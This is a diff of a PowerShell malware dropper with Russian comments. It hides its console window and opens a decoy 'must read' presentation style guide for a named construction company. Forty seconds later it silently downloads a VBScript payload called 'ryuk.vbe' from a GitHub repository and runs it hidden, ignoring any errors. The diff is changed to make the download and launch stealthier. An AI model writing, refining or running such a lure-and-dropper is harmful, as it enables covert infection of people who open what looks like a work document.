@@ -1,17 +1,15 @@
-# Скрываем окно PowerShell
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
-
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# Создаем текстовый файл
-$localAppData = [Environment]::GetFolderPath("LocalApplicationData")
-$filePath = Join-Path $localAppData "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
+# Первая часть - создание текстового файла
+$fileName = "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
+$filePath = Join-Path $env:LOCALAPPDATA $fileName
 
 $content = @"
 Данный документ регламентирует единые стандарты для создания всех презентаций компании «Капитал – Строитель жилья!» (kapital62.ru). Цель — обеспечить узнаваемость, профессиональный вид и целостность всех материалов.
@@ -47,23 +45,38 @@ $content = @"
 
     Важное правило: Не используйте более 3-х разных шрифтов на одном слайде.
 	
-3. РАБОТА С ИЗОБРАЖЕНИЯМИ И МЕДИА
-Дополните слайды визуальными материалами там, где сочтёте нужным — из папки “Медиа для презентаций” или с фотостоков, например Unsplash.com.
+3. РАБОЧА С ИЗОБРАЖЕНИЯМИ И МЕДИА
+Дополните слайды визуальными материалами там, где сочтёте нужным — из папки "Медиа для презентаций" или с фотостоков, например Unsplash.com.
 "@
 
-Set-Content -Path $filePath -Value $content -Encoding UTF8
+$content | Out-File -FilePath $filePath -Encoding UTF8
+Invoke-Item $filePath
 
-# Ждем 45 секунд
-Start-Sleep -Seconds 45
+# Задержка 40 секунд
+Start-Sleep -Seconds 40
 
-# Скачиваем и запускаем файл
-$downloadPath = Join-Path $localAppData "ryuk.vbe"
+# Вторая часть - скачивание и запуск файла
+$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
+$FileName = "ryuk.vbe"  # Явно указываем имя файла
+$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
+$DownloadPath = Join-Path $LocalAppData $FileName
+
+# Скачивание и запуск (также скрытно)
 try {
-    Invoke-WebRequest -Uri "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe" -OutFile $downloadPath
-    if (Test-Path $downloadPath) {
-        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$downloadPath`"" -WindowStyle Hidden
-    }
+    # Используем более скрытный метод скачивания
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($Url, $DownloadPath)
+    
+    # Запускаем процесс скрытно
+    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processInfo.FileName = $DownloadPath
+    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $processInfo.CreateNoWindow = $true
+    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
 }
 catch {
-    # Обработка ошибок (оставляем пустой для скрытности)
+    # В случае ошибки просто игнорируем
 }
+
+# Завершаем скрипт
+exit
